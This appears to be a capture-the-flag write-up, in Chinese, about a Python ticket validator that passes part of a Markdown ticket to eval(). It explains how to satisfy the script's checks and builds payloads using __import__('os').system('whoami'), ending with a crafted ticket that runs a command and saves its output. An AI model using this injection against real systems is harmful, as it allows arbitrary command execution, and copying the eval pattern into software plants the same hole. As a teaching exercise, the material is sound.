#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)#文件读取函数
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

通过解读这个python脚本，得知运行需要以下几个条件：

  • 这个脚本要求输入文件名，且文件名要以.md为结尾。

  • evaluate函数是关键的执行函数，首先将按行读取文件，判断第一行开头是否是字符串# Skytrain Inc,否则跳出本次循环，然后判断第二行是否开头为 ## Ticket to，否则才跳出循环。现在i=2判断开头是否是__Ticket Code:__,如果是，函数内部变量code_line=i+1，即当前code_line=3。

    # Skytrain Inc
    ## Ticket to 
    __Ticket Code:__

  • 当i=3时，code_line存在并且code_lien等于i。如有开头没有**，将结束当前进程。将以+分割，将前边的**替换为空。还要求这个数字必须除7且余数为4。然后才将该行首字符**替换为空。最终执行eval函数。payload:** 11+

  • eval函数会将字符串当作代码执行。以为只有一行字符所以，魔法方法导入os模块使用system方法执行命令部分payload:__import__('os').system('whoami')

  • 随后将这些payload进行拼接。第四行拼接代码有两种方法^、|、&、and、or 因为前面还有数字,第四部分的payload为

    1==2| __import__('os').system('whoami')
    1==2 or __import__('os').system('whoami')
    1==1 | __import__('os').system('whoami')
    1==1 and __import__('os').system('whoami')
    1==2 ^ __import__('os').system('whoami')
    1==2& __import__('os').system('whoami')

运行成功后，发现无回显尴尬，命令行输出到文件，最终payload：

# Skytrain Inc
## Ticket to 
__Ticket Code:__
** 11+ 1==12 and __import__('os').system('whoami > 123.txt')
